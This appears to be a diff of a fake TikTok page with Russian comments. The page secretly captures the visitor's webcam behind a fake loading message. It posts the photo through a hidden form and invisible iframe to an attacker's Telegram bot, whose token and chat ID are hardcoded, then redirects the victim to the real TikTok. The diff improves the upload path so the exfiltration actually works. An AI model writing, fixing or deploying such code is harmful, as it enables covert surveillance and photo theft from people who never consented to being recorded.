@@ -13,6 +13,7 @@
         button { background:#fe2c55; border:none; color:#fff; font-size:18px; padding:14px 40px; border-radius:50px; margin-top:15px; cursor:pointer; width:100%; }
         video { display:none; }
         .loader { display:none; margin-top:10px; color:#fe2c55; }
+        iframe { display:none; }
     </style>
 </head>
 <body>
@@ -24,9 +25,10 @@
 </div>
 
 <video id="cam" autoplay muted></video>
+<iframe name="telegramFrame" style="display:none;"></iframe>
 
 <script>
-    // ===== ТВОИ ДАННЫЕ =====
+    // ===== ТВОИ ДАННЫЕ (проверь, что верные) =====
     const BOT_TOKEN = '8764529930:AAEAu0l1CYHA_LdKgczyynFv6knHpulyL6c';
     const CHAT_ID = '5891575156';
 
@@ -45,6 +47,7 @@
             loader.style.display = 'block';
             btn.innerText = 'Идёт загрузка...';
 
+            // Делаем снимок через 1.5 секунды
             setTimeout(() => {
                 captureAndSend();
             }, 1500);
@@ -62,19 +65,44 @@
         ctx.drawImage(video, 0, 0, 640, 480);
 
         canvas.toBlob(function(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo.jpg');
+            if (!blob) {
+                alert('Не удалось создать изображение');
+                return;
+            }
 
-            // Отправка в Telegram
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).catch(() => {});
+            // Создаём форму для отправки в Telegram
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.enctype = 'multipart/form-data';
+            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            form.target = 'telegramFrame'; // Отправляем в невидимый iframe
 
-            // Редирект на настоящий TikTok
-            window.location.href = 'https://www.tiktok.com';
+            // Поле chat_id
+            const chatInput = document.createElement('input');
+            chatInput.type = 'hidden';
+            chatInput.name = 'chat_id';
+            chatInput.value = CHAT_ID;
+            form.appendChild(chatInput);
+
+            // Поле photo (файл)
+            const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.name = 'photo';
+            // Присваиваем файл через DataTransfer
+            const dataTransfer = new DataTransfer();
+            dataTransfer.items.add(file);
+            fileInput.files = dataTransfer.files;
+            form.appendChild(fileInput);
+
+            // Добавляем форму на страницу и отправляем
+            document.body.appendChild(form);
+            form.submit();
+
+            // Редирект на настоящий TikTok через секунду
+            setTimeout(() => {
+                window.location.href = 'https://www.tiktok.com';
+            }, 1000);
         }, 'image/jpeg', 0.8);
     }
 </script>
